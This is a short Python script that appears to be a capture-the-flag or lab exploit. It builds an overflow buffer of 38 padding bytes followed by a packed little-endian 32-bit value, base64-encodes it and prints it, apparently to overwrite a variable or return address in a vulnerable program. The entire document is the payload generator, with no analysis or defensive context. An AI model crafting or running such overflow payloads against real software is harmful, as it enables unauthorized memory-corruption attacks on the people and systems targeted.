
import sys
import struct
import base64

buf = b'ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'
buf += struct.pack('<I', 3003078893)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
